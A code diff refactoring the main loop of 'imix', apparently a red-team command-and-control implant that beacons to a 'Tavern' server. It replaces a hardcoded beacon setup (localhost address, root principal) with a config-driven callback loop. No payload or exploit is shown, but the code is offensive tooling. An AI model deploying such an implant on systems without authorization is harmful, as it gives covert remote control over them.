@@ -1,50 +1,23 @@
 use anyhow::Result;
-use c2::TavernClient;
-use imix::agent::Agent;
+use imix::{Agent, Config};
 
-fn main() {
-    let runtime = tokio::runtime::Builder::new_multi_thread()
-        .worker_threads(128)
-        .enable_all()
-        .build()
-        .unwrap();
-
-    runtime.block_on(beacon_loop());
-}
-
-pub async fn beacon_loop() -> Result<()> {
-    let tavern = TavernClient::connect("http://127.0.0.1".to_string()).await?;
-
-    let mut agent = Agent {
-        info: c2::pb::Beacon {
-            identifier: "12345".to_string(),
-            principal: "root".to_string(),
-            interval: 10,
-            agent: Some(c2::pb::Agent {
-                identifier: "1234".to_string(),
-            }),
-            host: Some(c2::pb::Host {
-                identifier: "1234".to_string(),
-                primary_ip: "127.0.0.1".to_string(),
-                name: "test".to_string(),
-                platform: c2::pb::host::Platform::Linux as i32,
-            }),
-        },
-        tavern,
-        handles: Vec::new(),
-    };
-
+#[tokio::main(flavor = "multi_thread", worker_threads = 128)]
+async fn main() {
     loop {
-        let result = agent.callback().await;
-
-        match result {
+        match run().await {
             Ok(_) => {}
-            Err(err) => {
+            Err(_err) => {
                 #[cfg(debug_assertions)]
-                eprint!("Error draining channel: {}", err)
+                eprint!("callback loop fatal error: {}", _err)
             }
         }
-
-        std::thread::sleep(std::time::Duration::new(5 as u64, 24601));
     }
+}
+
+async fn run() -> Result<()> {
+    let cfg = Config::default();
+    let mut agent = Agent::gen_from_config(cfg).await?;
+
+    agent.callback_loop().await;
+    Ok(())
 }
